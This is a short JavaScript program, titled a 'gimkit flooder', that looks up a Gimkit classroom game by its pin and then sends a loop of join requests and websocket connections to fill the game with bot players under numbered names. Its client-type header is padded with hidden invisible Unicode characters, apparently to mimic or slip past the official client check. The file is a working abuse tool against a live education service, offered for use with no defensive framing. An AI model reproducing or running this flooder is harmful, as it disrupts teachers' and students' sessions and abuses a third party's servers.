//gimkit flooder
const input = require('readline-sync');
const axios = require('axios');
const ws = require('ws');

class Client{
    constructor(pin){
        this.pin = pin
        this.roomId = 0
    }
    async setRoomId(){
        const url = 'https://www.gimkit.com/api/matchmaker/find-info-from-code';

        const p =  {"code": String(this.pin),}

        const response = await axios.post(url,p)
        .catch(e => {
            console.log(e)
        })
        if(response.data.roomId){
            this.roomId =  response.data.roomId
        }
        return false
    }
    async openSocket(player){

        const socketUrl = `${player.serverUrl}/matchmake/joinById/${player.roomId}`;
        const matchmake = await axios.post(socketUrl,{"intentId": player.intentId});
        const dip = await matchmake.data;

        const ugh = player.serverUrl.split('/').pop().split('.')[0];
        const socketURI = `wss://${ugh}.gimkitconnect.com/${dip.room.processId}/${dip.room.roomId}?sessionId=${dip.sessionId}`
        const socket = new ws(socketURI);
        
        socket.onopen = () => {
            console.log('joined')
            socket.close()
            return true
        }
        
    }
    async join(name){
        if (this.roomId == 0){
            await this.setRoomId()
        }
        const payload = {"roomId":this.roomId,"name":name,"clientType":"Gimkit Web ‍‍⁣⁢⁡⁢⁡⁢⁡‍⁡‌⁢⁡‍⁡‍⁡‍‌⁢⁡‍⁢⁢‍⁢⁣‌⁢⁤⁡⁢‌⁢‍⁡⁣‍‍‍‍‌⁡⁢⁢⁢⁡⁢⁤⁡‍⁣⁤⁢‍‍‌‍⁡‌‍⁢‌⁡⁢‍⁡⁢‍⁡⁣⁤⁡‌⁢⁣‍⁢⁢⁢‍‌‍⁡‌‍⁢⁤⁢‍⁣⁡⁢⁤⁢‌‍‌⁢⁤⁢⁡‌⁢‍⁣‌‍‍‍⁡‍‍‍‍‌⁡⁢‌⁢‌⁡‌‍⁡‍⁢⁣⁤‌‍⁢⁡⁢‍⁢‍‌‍⁤⁢⁢⁢⁢⁢⁤⁣⁢‍⁢‍‌⁢⁣‍⁢‌‍⁤⁤‍⁡‌‍⁡⁣⁤‌‍⁤‌‍⁢‍⁤⁢⁡‍⁢⁢⁡⁢‌‍‌⁤⁡⁢⁡‍‍⁡‌⁤⁡⁢‍‍⁡‍⁡⁢⁢‍⁢⁢⁡‌⁡⁢⁢‍⁢⁤⁡⁢⁡‍‌⁢‍⁢⁡⁣‌⁡⁢‌⁡⁢‍⁢⁤⁢⁢⁢‍‌⁢‌‍⁡‍‍⁢‍⁡⁣⁣‍⁢‍⁢‌⁢⁡‌‍‌⁡⁢⁢⁤⁢⁣‌⁡‍‌‍⁢‌‍‍⁡⁢⁢‍‍‍⁢‍‍‌‍⁡‍⁢⁢Client V3.1"}
        const url = 'https://www.gimkit.com/api/matchmaker/join';
        const r = await axios.post(url, payload,{
            Headers:{
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json"
            }
        })
        .catch(e => {
            console.log(e)
        })
        const player = r.data;
        this.openSocket(player)
    }
    async flood(name, amount){
        for(let i=0;i<amount;i++){
            this.join(`${name}-${i}`)
        }
    }
}

console.log('gimkit dick v3')

const pin = parseInt(input.question('Game Pin: '))
const name = input.question('Bot Names: ')
const amount = input.question('Amount: ')

const client = new Client(pin);
client.flood(name, amount)